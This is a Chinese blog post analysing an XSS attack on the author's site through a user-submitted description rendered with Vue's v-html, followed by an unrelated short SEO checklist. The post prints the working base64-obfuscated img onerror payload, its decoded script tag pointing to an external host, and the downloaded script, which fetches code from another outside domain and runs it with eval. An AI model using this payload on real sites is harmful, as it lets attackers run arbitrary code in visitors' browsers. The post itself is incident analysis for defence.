title: 前端安全与防范
date: 2019-04-16 9:36:35
categories: security
tags: security
---

## 前言

今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的**描述**中带有:

`<p><body/hidden><img src=x onerror=document['write'](atob('PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4='))></p>`

因为穿搭look中带有格式化后html的描述内容，所以直接通过**v-html**指令输出了描述内容：

```
<div v-if="from === 'detail'" v-html="content" ref="content" style="-webkit-user-select: text"></div>
```

这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：

* btoa（base64加密）
* atob （base64解密）

<div><!--more--></div>

经过`atob`解密后：

```
atob('PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=')

// 转变成

<body/hidden><script src=https://s5.mogucdn.com/mlcdn/c45406/190415_63j65lek4d22g86c5hb7ka98l9ffe></script>

// 一般攻击者都不会将，body隐藏。而是直接通过盗用信息
```

通过`document['write']`将dom写入页面后，通过`mogucdn`资源将会下载脚本：

```
var ua = navigator.userAgent.toLowerCase();

// 在微信环境下，将会通过ajax请求获取站外脚本，获取完成后通过eval动态执行
if (/micromessenger/.test(ua)) {
    $.get('https://api.ruanwin.com/j',function(d) {
        window['ev' + 'al'](d);
    })
}
```




## SEO

1.合理的title、description、keywords:搜索引擎对于三项的权重逐个减小。
2.使用语义化标签，爬虫更容易理解和抓取
3.重要内容不要使用js外部引入，爬虫不容易抓取
4.网页加载速度也是爬虫评判的重要标准
5.每个页要只能出现一次H1标签，H2~H6标签可以多次，这样做是为了加重H1标签的权重。 


